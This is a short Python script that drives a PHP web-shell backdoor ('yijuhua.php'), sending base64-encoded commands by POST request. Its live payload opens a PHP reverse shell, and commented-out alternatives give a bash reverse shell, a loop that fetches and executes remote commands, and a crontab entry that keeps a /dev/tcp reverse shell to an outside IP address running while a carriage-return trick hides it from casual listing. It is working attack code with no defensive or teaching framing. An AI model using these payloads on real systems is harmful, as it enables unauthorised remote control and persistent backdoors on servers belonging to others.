# coding:utf-8

import requests
import base64

url = "http://127.0.0.1/429/yijuhua.php"

#system = "system('ls ./');"
# system = """
# #unlink($_SERVER['SCRIPT_FILENAME']);
# ignore_user_abort(true);
# set_time_limit(0);

# while (true) {
#     $str = file_get_contents('http://localhost/429/test.txt');
#     system($str);
#     sleep(1);
# }
# """
# system = """
# $sock=fsockopen("127.0.0.1",7890);exec("/bin/sh -i <&3 >&3 2>&3");
# """

# system = '''
# system("crontab -l;echo \\"* * * * * bash -c \'exec 9<> /dev/tcp/45.62.96.72/23334&&exec 0<&9&&exec 1>&9 2>&1&&/bin/bash --noprofile -i\'&&\\rno crontab for `whoami`%150c\\n\\"|crontab -");
# '''
# system = '''
# system('bash -i >& /dev/tcp/127.0.0.1/4444 0>&1');
# '''
system = '''
system('php -r \'$sock=fsockopen("127.0.0.1","4444");exec("/bin/sh -i <&3 >&3 2>&3");\'');
'''
code = base64.b64encode(system)
payload = {'test':code}
r = requests.post(url, data = payload)
#r = requests.get(url)
print r.content